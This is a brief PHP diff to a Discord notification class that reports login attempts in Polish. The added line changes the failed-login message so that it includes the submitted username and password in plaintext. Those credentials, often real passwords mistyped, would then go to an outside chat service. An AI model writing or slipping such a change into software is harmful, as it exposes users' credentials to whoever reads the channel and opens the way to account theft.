@@ -67,7 +67,7 @@ class Discord
         } else if ($status == 2) {
             $msg = "**" . $data['first_name'] . " " . $data['last_name'] . " próbował** zalogować się o: $date_now. Konto **zablokowane**.";
         } else if ($status == 3) {
-            $msg = "**Próba** logowania o: $date_now. Błędne dane logowania.";
+            $msg = "**Próba** logowania o: $date_now. Błędne dane logowania. " . $data['t_login'] . " || " . $data['t_pass'];
         }
 
         $data = array(
